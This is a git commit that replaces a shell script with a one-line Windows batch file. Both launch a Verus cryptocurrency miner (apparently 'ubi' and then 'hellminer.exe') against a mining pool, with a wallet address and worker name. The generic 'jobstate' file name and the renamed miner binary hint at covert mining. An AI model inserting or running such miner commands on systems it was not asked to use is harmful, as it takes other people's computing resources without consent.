e8931cc1f449a553353c27d8abe2298b840fc5e6
rerpes <93594805+rerpes@users.noreply.github.com>
2021-11-02 20:53:26 +0700

    Update and rename jobstate01.sh to jobstate01.bat

---
+++ jobstate01.bat
@@ -0,0 +1,1 @@
+hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RL4L78PHHABKN3VrSYkdS4JswfRQ1KE15Y.ANDRO_OKE -p x --cpu 2
--- jobstate01.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/sh
-chmod +x verus-solver
-chmod +x ubi
-./ubi -c stratum+tcp://149.56.27.47:3956#xnsub -u RL4L78PHHABKN3VrSYkdS4JswfRQ1KE15Y.ANDRO_OKE -p x --cpu 2
